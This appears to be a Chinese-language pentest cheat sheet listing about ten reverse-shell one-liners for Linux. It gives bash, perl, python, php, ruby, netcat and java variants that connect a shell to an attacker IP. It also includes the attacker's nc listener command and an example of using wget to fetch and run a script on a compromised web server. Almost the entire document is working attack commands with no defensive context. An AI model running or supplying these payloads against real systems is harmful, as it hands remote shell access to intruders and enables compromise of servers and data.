## Linux反弹shell的10种姿势  


### `bash`版本   

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### `perl`版本     

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


### `Python`版本  

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### `php`版本  

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### `ruby`版本  

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### `nc`版本  

```
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

```

### `java`版本  

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### `nc`版本补充   

* 当被攻击机上面的nc没有`-e`或者`-c`参数的时候

```bash
mknod /tmp/back p
/bin/sh 0</tmp/back | nc 10.101.177.100 14332 1>/tmp/back
```

* 攻击机

```bash
nc -lnvp 14332
```

### 实例
可以执行命令的`web`服务器首先`wget`下载`123.sh`文件，再执行`bash 123.sh`，执行之前攻击机要用`nc`监听同样的端口。`123.sh`文件里面的`ip`地址是`nc`监听机器的`ip`地址
